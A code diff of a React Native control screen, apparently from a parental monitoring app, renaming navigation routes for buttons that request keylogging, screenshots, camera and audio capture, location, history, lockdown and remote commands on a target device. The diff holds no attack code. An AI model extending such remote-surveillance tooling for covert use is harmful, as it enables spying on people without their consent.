@@ -2,14 +2,7 @@ import { React } from "react";
 import { Pressable } from "react-native";
 import { SafeAreaView } from "react-native-safe-area-context";
 import { Text, View } from "react-native-web";
-import {
-  Ionicons,
-  FontAwesome5,
-  Feather,
-  MaterialCommunityIcons,
-  Entypo,
-  AntDesign,
-} from "@expo/vector-icons";
+import { Ionicons, FontAwesome5, Feather, MaterialCommunityIcons, Entypo, AntDesign } from "@expo/vector-icons";
 import ParentMenu from "../components/ParentMenu";
 import global from "../config/global";
 import colors from "../config/colors";
@@ -32,7 +25,7 @@ const ControlOptions = ({ navigation, route }) => {
             <Pressable
               style={global.MenuButton}
               onPress={() =>
-                navigation.navigate("Request", { uid: uid, type: "SCREENSHOT", name:name })
+                navigation.navigate("Immediately Request", { uid: uid, type: "SCREENSHOT", name:name })
               }
             >
               <MaterialCommunityIcons
@@ -45,7 +38,7 @@ const ControlOptions = ({ navigation, route }) => {
             <Pressable
               style={global.MenuButton}
               onPress={() =>
-                navigation.navigate("Request", { uid: uid, type: "KEYLOG", name:name })
+                navigation.navigate("Immediately Request", { uid: uid, type: "KEYLOG", name:name })
               }
             >
               <Entypo
@@ -59,7 +52,7 @@ const ControlOptions = ({ navigation, route }) => {
             <Pressable
               style={global.MenuButton}
               onPress={() =>
-                navigation.navigate("Request", { uid: uid, type: "CAMERA", name:name })
+                navigation.navigate("Immediately Request", { uid: uid, type: "CAMERA", name:name })
               }
             >
               <Feather
@@ -74,7 +67,7 @@ const ControlOptions = ({ navigation, route }) => {
             <Pressable
               style={global.MenuButton}
               onPress={() =>
-                navigation.navigate("Request", { uid: uid, type: "AUDIO", name:name })
+                navigation.navigate("Immediately Request", { uid: uid, type: "AUDIO", name:name })
               }
             >
               <FontAwesome5
@@ -87,7 +80,7 @@ const ControlOptions = ({ navigation, route }) => {
             <Pressable
               style={global.MenuButton}
               onPress={() =>
-                navigation.navigate("Request", { uid: uid, type: "LOCKDOWN", name:name })
+                navigation.navigate("Not Immediately Request", { uid: uid, type: "LOCKDOWN", name:name })
               }
             >
               <MaterialCommunityIcons
@@ -100,7 +93,7 @@ const ControlOptions = ({ navigation, route }) => {
             <Pressable
               style={global.MenuButton}
               onPress={() =>
-                navigation.navigate("Request", { uid: uid, type: "COMMAND", name:name })
+                navigation.navigate("Not Immediately Request", { uid: uid, type: "COMMAND", name:name })
               }
             >
               <Ionicons
@@ -115,7 +108,7 @@ const ControlOptions = ({ navigation, route }) => {
             <Pressable
               style={global.MenuButton}
               onPress={() =>
-                navigation.navigate("Request", { uid: uid, type: "LOCATION", name:name })
+                navigation.navigate("Immediately Request", { uid: uid, type: "LOCATION", name:name })
               }
             >
               <Ionicons
@@ -128,7 +121,7 @@ const ControlOptions = ({ navigation, route }) => {
             <Pressable
               style={global.MenuButton}
               onPress={() =>
-                navigation.navigate("Request", { uid: uid, type: "HISTORY", name:name })
+                navigation.navigate("Not Immediately Request", { uid: uid, type: "HISTORY", name:name })
               }
             >
              <FontAwesome5 
@@ -141,7 +134,7 @@ const ControlOptions = ({ navigation, route }) => {
             <Pressable
               style={global.MenuButton}
               onPress={() =>
-                navigation.navigate("Request", { uid: uid, type: "CONFIGURATION", name:name })
+                navigation.navigate("Not Immediately Request", { uid: uid, type: "CONFIGURATION", name:name })
               }
             >
               <AntDesign
